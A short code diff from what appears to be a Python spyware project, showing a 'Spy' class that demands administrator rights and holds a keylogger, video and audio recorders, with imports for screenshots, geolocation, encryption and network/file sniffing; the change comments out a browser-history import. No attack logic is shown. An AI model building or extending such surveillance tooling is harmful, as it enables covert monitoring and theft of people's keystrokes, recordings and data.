@@ -8,13 +8,13 @@ from pyautogui import screenshot
 import geocoder
 from spying.encrypt import Encryptor
 from spying.snnifing import netstart, filestart, stop_sniffing
-from browser_history import get_history, get_bookmarks
+# from browser_history import get_history, get_bookmarks
 
 
 class Spy:
     def __init__(self):
         if not admin.make_admin():
-           exit()
+            exit()
         self.keyLogger: Optional[KeyLogger] = None
         self.video_recorder: Optional[VideoRecorder] = None
         self.audio_recorder: Optional[AudioRecorder] = None
